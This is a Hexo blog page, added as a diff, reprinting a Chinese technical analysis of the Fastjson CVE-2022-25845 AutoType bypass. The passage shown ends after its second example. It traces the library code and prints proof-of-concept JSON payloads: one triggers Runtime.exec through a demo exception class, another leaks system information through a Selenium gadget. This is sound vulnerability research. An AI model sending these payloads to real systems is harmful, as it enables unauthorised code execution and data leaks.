@@ -1,0 +1,476 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+    
+    <title>Tag: Reprint | 氕氘氚</title>
+    <meta name="keywords" content="hexo,theme,otakism,otaku"/>
+    <meta name="HandheldFriendly" content="True"/>
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="google-site-verification" content=""/>
+    <meta name="baidu-site-verification" content=""/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="Open your eyes to see the light in life">
+<meta property="og:type" content="website">
+<meta property="og:title" content="氕氘氚">
+<meta property="og:url" content="http://example.com/tags/Reprint/page/4/index.html">
+<meta property="og:site_name" content="氕氘氚">
+<meta property="og:description" content="Open your eyes to see the light in life">
+<meta property="og:locale">
+<meta property="article:author" content="Szczecin">
+<meta name="twitter:card" content="summary">
+    
+
+    <!-- Favicon -->
+    
+        <link rel="icon" href="/img/favicon.ico" />
+    
+
+    <!-- Font -->
+    <link href="https://fonts.googleapis.com/css?family=Inconsolata|Roboto:300,400,700" rel="stylesheet">
+
+    
+<link rel="stylesheet" href="/style.css">
+
+    <script>
+      function setLoadingBarProgress(num) {
+        document.getElementById('loading-bar').style.width = num + "%";
+      }
+    </script>
+
+    
+
+
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+
+<div id="loading-bar-wrapper">
+  <div id="loading-bar"></div>
+</div>
+
+<script>setLoadingBarProgress(20)</script>
+
+<div id="site-wrapper">
+
+    <header id="header">
+    <div id="header-wrapper" class="clearfix">
+        <a id="logo" href="/">
+            <img src="/img/logo.png"/>
+            <span id="site-desc">
+                Be A Gorgeous World
+            </span>
+        </a>
+        <button id="site-nav-switch">
+            <span class="icon icon-menu"></span>
+        </button>
+    </div>
+</header>
+    <script>setLoadingBarProgress(40);</script>
+
+    <main id="main" role="main">
+        
+  <section class="page-header tag">
+    <h1>- <span>Reprint</span> -</h1>
+  </section>
+
+
+
+
+
+
+<section class="post-list">
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2022/08/03/CVE-2022-25845-Fastjson/">
+                CVE-2022-25845 – Fastjson
+            </a>
+        </h2>
+    
+    <time>
+        Aug 3, 2022
+    </time>
+    <section class="content">
+        <h1><span id="cve-2022-25845-fastjson-auto-type-bypass-rce漏洞分析">CVE-2022-25845 – Fastjson “Auto Type Bypass” RCE漏洞分析</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/d4702da8b93e?u_atoken=e8be5a2e-d2f2-40e8-9032-eb762ac70e4d&u_asession=016gAHNAGW5kwEmr9SHcziNNztkuT3HPV9Qi1BUpHrLJq9hEVlxH_k1w9FiGt4iz1TX0KNBwm7Lovlpxjd_P_q4JsKWYrT3W_NKPr8w6oU7K_nesHWq-uvzShryNdruwb_Ppcarp92QKzyJKyYjREPlmBkFo3NEHBv0PZUm6pbxQU&u_asig=0571xFqT6ytNlYS2FmxKjAUaC7IIZzHH_wNoBkl0fuXB7L7i_BKRMiYdR7WkEyOH04jON-Y6ZkqCQaLBYWgAvEfdDsRAMInmkstRXd3gA_02JitfEM0sXqs1ygakF_Gssvi8K917w5adBQOQPWp0fT6NXrc-haXIlf4ev16Nwyo_H9JS7q8ZD7Xtz2Ly-b0kmuyAKRFSVJkkdwVUnyHAIJze09tESGin2xLknH8nQ1NfDH10X8edffiTaObeVvRyl4WPRPQyB_SKrj-61LB_f61u3h9VXwMyh6PgyDIVSG1W88Y2fYLRHbT4ia04fxhHA1ybLonYZfH1eNUN_6rAKYnOe2A-SmkXiAo5UbaV32iFMBBLacmUFwtytO_4ZvRIY1mWspDxyAEEo4kbsryBKb9Q&u_aref=ErhmyQTxFTESTC8Ph/fkOki3fC0=">vayci</a></p>
+</blockquote>
+<h2><span id="前言">前言</span></h2><blockquote>
+<p>几周前， Fastjson 发布了一个新版本 (1.2.83) ，其中包含一项安全漏洞修复。据称攻击者可以利用此漏洞在远程机器上执行代码。根据发布的多篇文章，攻击者通过漏洞可以绕过Fastjson中的“AutoTypeCheck”机制，完成远程代码执行。</p>
+<p>这个 Fastjson 漏洞最近才收到一个 CVE 漏洞标识符 – CVE-2022-25845，以及高达8.1的CVSS漏洞评分。尽管如此，这个漏洞仍扑朔迷离。尽管这是被宣称为在无处不在的组件中存在的一个高危RCE漏洞（将近5000个Maven项目都存在Fastjson依赖！），却几乎没有任何关于它的公开技术细节。到底是哪里存在漏洞，又是在什么条件下容易被攻击？</p>
+<p>在本篇文章中，我们深入研究了这个Fastjson漏洞的严重性，以及那些类型的Java应用程序受此影响。文末是给目前无法升级到指定Fastjson版本的开发人员的一些策略建议。</p>
+</blockquote>
+<h2><span id="哪些情况会受到cve-2022-25845漏洞的影响">哪些情况会受到CVE-2022-25845漏洞的影响？</span></h2><blockquote>
+<p>所有依赖 Fastjson 版本 1.2.80 或更早版本的程序，在应用程序中如果包含使用用户数据调用 JSON.parse 或 JSON.parseObject 方法，但不指定要反序列化的特定类，都会受此漏洞的影响。</p>
+<p><img src="/2022/08/03/CVE-2022-25845-Fastjson/1.png" alt="image" title="存在潜在风险的API和安全API的不完全示例"></p>
+<p>虽然看起来很宽泛，但是我们可以发现，在这些前提条件下，攻击者也只能通过这个漏洞调用特定类型的Java反序列化gadget（继承Throwable类的gadget类），这大大限制了这个漏洞的实际影响。</p>
+</blockquote>
+<h2><span id="技术深入探究">技术深入探究</span></h2><blockquote>
+<p>Fastjson 是一个 Java 库，可以将 Java 对象序列化和反序列化，实现Java对象和JSON的相互转换。</p>
+<p>和大多数 JSON 类一样，Fastjson 支持将基本 JSON 类型（数组和对象）分别序列化和反序列化为它们的 Java 等价对象——Arrays 和 Maps。</p>
+<p>然而，Fastjson也可以将用户的Java对象（POJO）序列化为JSON，或从JSON反序列化为Java对象。</p>
+<p>例如，我们定义了一个名为User的类，以下代码时将其进行序列化为JSON，然后再进行反序列化。</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span></span><br><span class="line">    &#123;</span><br><span class="line">        ...</span><br><span class="line">  <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> JSON.toJSONString(user);</span><br><span class="line">  <span class="type">User</span> <span class="variable">user2</span> <span class="operator">=</span> JSON.parseObject(jsonString, User.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>JSON.parseObject()返回一个 JSONObject 对象， 然后这个对象又转换为User类。</p>
+<p>有时候，开发人员想要更灵活的代码来接收序列化的JSON，告诉代码JSON应该被反序列化为哪种类。例如下面这种JSON形式：</p>
+</blockquote>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">    <span class="attr">&quot;users&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AdminUser&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;admin&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;21232f297a57a5a743894a0e4a801fc3&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;GuestUser&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;guest&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Fastjson 支持一个名为“AutoType”的功能。启用该功能后，可以为每个用户entry引入类型。开发人员只需要调用如下代码：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">JSONObject</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonString, Feature.SupportAutoType);</span><br><span class="line"><span class="type">JSONArray</span> <span class="variable">users</span> <span class="operator">=</span> (JSONArray)obj.get(<span class="string">&quot;users&quot;</span>);</span><br><span class="line"><span class="comment">// Users[0] is of class type &quot;AdminUser&quot;</span></span><br><span class="line"><span class="comment">// Users[1] is of class type &quot;GuestUser&quot;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>但是，如果反序列化的JSON是用户可以控制的，则在启用AutoType的情况下对其进行解析可能会出现反序列化安全问题。因为攻击者可以实例化Classpath上可用的任意类，并为类的构造函数提供任意参数。这个问题已经被很多次证实确实可以利用，并且例如ysoserial之类的框架就存在这里攻击手段的风险（Java的“gadget”类）。</p>
+<p>因此，Fastjson的开发者选择默认禁用了AutoType功能，这应该能够安全地解析人员JSON数据了。但是，AutoType的机制比这复杂得多…</p>
+</blockquote>
+<h2><span id="绕过-autotype-默认禁用策略">绕过 AutoType 默认禁用策略</span></h2><blockquote>
+<p>当JSON.parseObject()被调用时，它最终会调用到 DefaultJSONParser.parseObject()，并且传入参数 object 为 JSONObject，fieldName 为 null。当这个方法遇到“@type”这个符号（JSON.DEFAULT_TYPE_KEY）时，就会调用config.checkAutoType：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (key == JSON.DEFAULT_TYPE_KEY</span><br><span class="line">        &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">typeName</span> <span class="operator">=</span> lexer.scanSymbol(symbolTable, <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lexer.isEnabled(Feature.IgnoreAutoType)) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>最终，在所有flag都是默认的情况下，代码会调用至config.checkAutoType()。在这里，我们可以看到因为被列入黑名单而无法通过AutoType 机制实例化的类列表。</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (expectClass == <span class="literal">null</span>) &#123;</span><br><span class="line">            expectClassFlag = <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">long</span> <span class="variable">expectHash</span> <span class="operator">=</span> TypeUtils.fnv1a_64(expectClass.getName());</span><br><span class="line">            <span class="keyword">if</span> (expectHash == <span class="number">0x90a25f5baa21529eL</span></span><br><span class="line">                    || expectHash == <span class="number">0x2d10a5801b9d6136L</span></span><br><span class="line">                    || expectHash == <span class="number">0xaf586a571e302c6bL</span></span><br><span class="line">                    || expectHash == <span class="number">0xed007300a7b227c6L</span></span><br><span class="line">                    || expectHash == <span class="number">0x295c4605fd1eaa95L</span></span><br><span class="line">                    || expectHash == <span class="number">0x47ef269aadc650b4L</span></span><br><span class="line">                    || expectHash == <span class="number">0x6439c4dff712ae8bL</span></span><br><span class="line">                    || expectHash == <span class="number">0xe3dd9875a2dc5283L</span></span><br><span class="line">                    || expectHash == <span class="number">0xe2a8ddba03e69e0dL</span></span><br><span class="line">                    || expectHash == <span class="number">0xd734ceb4c3e9d1daL</span></span><br><span class="line">            ) &#123;</span><br><span class="line">                expectClassFlag = <span class="literal">false</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                expectClassFlag = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这些被Ban的类是以下这些：</p>
+<ul>
+<li>java.lang.Object</li>
+<li>java.io.Serializable</li>
+<li>java.lang.Cloneable</li>
+<li>java.lang.Runnable</li>
+<li>java.lang.AutoCloseable</li>
+<li>java.io.Closeable</li>
+<li>java.lang.Iterable</li>
+<li>java.util.Collection</li>
+<li>java.lang.Readable</li>
+<li>java.util.EventListener</li>
+</ul>
+<p>你也可以在 fastjson-blacklist 查看到更多被列入黑名单的类。这个仓库维护了被列入Fastjson黑名单的类的hash值。</p>
+<p>最后，代码将尝试找到一个反序列化器deserializer，用来对这个已经被JSON序列化的类进行反序列化。</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ObjectDeserializer</span> <span class="variable">deserializer</span> <span class="operator">=</span> config.getDeserializer(clazz);</span><br><span class="line"><span class="type">Class</span> <span class="variable">deserClass</span> <span class="operator">=</span> deserializer.getClass();</span><br><span class="line"><span class="keyword">if</span> (JavaBeanDeserializer.class.isAssignableFrom(deserClass)</span><br><span class="line">    &amp;&amp; deserClass != JavaBeanDeserializer.class</span><br><span class="line">    &amp;&amp; deserClass != ThrowableDeserializer.class) &#123;</span><br><span class="line">    <span class="built_in">this</span>.setResolveStatus(NONE);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (deserializer <span class="keyword">instanceof</span> MapDeserializer) &#123;</span><br><span class="line">    <span class="built_in">this</span>.setResolveStatus(NONE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> deserializer.deserialze(<span class="built_in">this</span>, clazz, fieldName);</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>在 ParserConfig.getDeserializer()内部，有一个关键检查，用于验证目标类是否继承了 Throwable 类：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Throwable.class.isAssignableFrom(clazz)) &#123;</span><br><span class="line">    deserializer = <span class="keyword">new</span> <span class="title class_">ThrowableDeserializer</span>(<span class="built_in">this</span>, clazz);</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>ThrowableDeserializer.deserialize()会处理这种数据。如果存在“@type”，它将使用 autoTypeCheck()检查并继续正常反序列化：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (JSON.DEFAULT_TYPE_KEY.equals(key)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (lexer.token() == JSONToken.LITERAL_STRING) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">exClassName</span> <span class="operator">=</span> lexer.stringVal();</span><br><span class="line">        exClass = parser.getConfig().checkAutoType(exClassName, Throwable.class, lexer.getFeatures());</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>因此，漏洞的核心在于 ，只要目标类继承自 Throwable 类，Fastjson便可以反序列化为任意类！</p>
+<p>在这种情况下，负责创建反序列化类的函数是 createException()，它处理了 3 种不同类型的构造函数。一个没有任何参数，一个带有异常消息的参数，一个带有异常消息和异常原因参数。在此之后，它将先尝试调用更为复杂的构造函数（causeConstructor、messageConstructor 和 defaultConstructor）：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Throwable <span class="title function_">createException</span><span class="params">(String message, Throwable cause, Class&lt;?&gt; exClass)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Constructor&lt;?&gt; defaultConstructor = <span class="literal">null</span>;</span><br><span class="line">        Constructor&lt;?&gt; messageConstructor = <span class="literal">null</span>;</span><br><span class="line">        Constructor&lt;?&gt; causeConstructor = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">for</span> (Constructor&lt;?&gt; constructor : exClass.getConstructors()) &#123;</span><br><span class="line">            Class&lt;?&gt;[] types = constructor.getParameterTypes();</span><br><span class="line">            <span class="keyword">if</span> (types.length == <span class="number">0</span>) &#123;</span><br><span class="line">                defaultConstructor = constructor;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (types.length == <span class="number">1</span> &amp;&amp; types[<span class="number">0</span>] == String.class) &#123;</span><br><span class="line">                messageConstructor = constructor;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (types.length == <span class="number">2</span> &amp;&amp; types[<span class="number">0</span>] == String.class &amp;&amp; types[<span class="number">1</span>] == Throwable.class) &#123;</span><br><span class="line">                causeConstructor = constructor;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (causeConstructor != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> (Throwable) causeConstructor.newInstance(message, cause);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (messageConstructor != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> (Throwable) messageConstructor.newInstance(message);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (defaultConstructor != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> (Throwable) defaultConstructor.newInstance();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>作为类实例化的一步，还会为每个相关成员变量调用一个 setter方法：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (otherValues != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="type">JavaBeanDeserializer</span> <span class="variable">exBeanDeser</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (exClass != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (exClass == clazz) &#123;</span><br><span class="line">            exBeanDeser = <span class="built_in">this</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">ObjectDeserializer</span> <span class="variable">exDeser</span> <span class="operator">=</span> parser.getConfig().getDeserializer(exClass);</span><br><span class="line">            <span class="keyword">if</span> (exDeser <span class="keyword">instanceof</span> JavaBeanDeserializer) &#123;</span><br><span class="line">                exBeanDeser = (JavaBeanDeserializer) exDeser;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (exBeanDeser != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; entry : otherValues.entrySet()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> entry.getKey();</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> entry.getValue();</span><br><span class="line"></span><br><span class="line">            <span class="type">FieldDeserializer</span> <span class="variable">fieldDeserializer</span> <span class="operator">=</span> exBeanDeser.getFieldDeserializer(key);</span><br><span class="line">            <span class="keyword">if</span> (fieldDeserializer != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">FieldInfo</span> <span class="variable">fieldInfo</span> <span class="operator">=</span> fieldDeserializer.fieldInfo;</span><br><span class="line">                <span class="keyword">if</span> (!fieldInfo.fieldClass.isInstance(value)) &#123;</span><br><span class="line">                    value = TypeUtils.cast(value, fieldInfo.fieldType, parser.getConfig());</span><br><span class="line">                &#125;</span><br><span class="line">                fieldDeserializer.setValue(ex, value);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2><span id="怎么利用-cve-2022-25845-漏洞">怎么利用 CVE-2022-25845 漏洞？</span></h2><blockquote>
+<p>在了解了AutoType 机制中的上述“漏洞”之后，让我们看看一个在现实中利用这个漏洞的可行性。这个漏洞据称可以实现远程代码执行。</p>
+<p>由 YoungBear 发布的漏洞利用方案，通过传入这个JSON可以运行任意系统操作命令。</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Exception&quot;</span>,</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.example.fastjson.poc20220523.Poc20220523&quot;</span>,</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;calc&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这个漏洞利用方案依赖于在 Java 应用程序中定义的下面这个继承Exception的类：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.fastjson.poc20220523;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> youngbear</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@email</span> youngbear@aliyun.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2022/5/29 8:28</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@blog</span> https://blog.csdn.net/next_second</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/YoungBear</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span> POC类：需要代码中有该类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc20220523</span> <span class="keyword">extends</span> <span class="title class_">Exception</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(str);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>当反序列化执行到上面这一段JSON时，Poc20220523这个类就创建了，并且提供name参数是通过自动调用setter方法。</p>
+<p>如代码所示，这将最终调用包含 str &#x3D; “calc”的恶意 setName() setter 函数：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String str)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Runtime.getRuntime().exec(str);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这部分的实际代码内容为打开windows计算器：</p>
+<p><img src="/2022/08/03/CVE-2022-25845-Fastjson/2.png" alt="image" title="计算器弹窗"></p>
+<p>这个漏洞利用方案显然只是一个演示，因为任何正常的 Java 应用程序都不会包含类似于 Poc20220523 这样会基于外部参数运行 shell 命令的异常派生类。</p>
+<p>现在亟待解决的问题是 — 是否有大家熟知的 Java“gadget”类可以作为此漏洞的一部分被滥用？即继承自Exception或Throwable，并且存在相关的构造函数或者setter方法，可能会造成实际安全影响的Java类。</p>
+<p>目前，有一个兼容的gadget类（来自 Selenium 库）已经在被发布了。它会导致非常低影响的数据泄漏：</p>
+</blockquote>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;x&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Exception&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.openqa.selenium.WebDriverException&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;y&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$x.systemInformation&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>反序列化这个 JSON 最终会创建一个 HashMap，其中“y”值为有关机器的一些基本信息：</p>
+</blockquote>
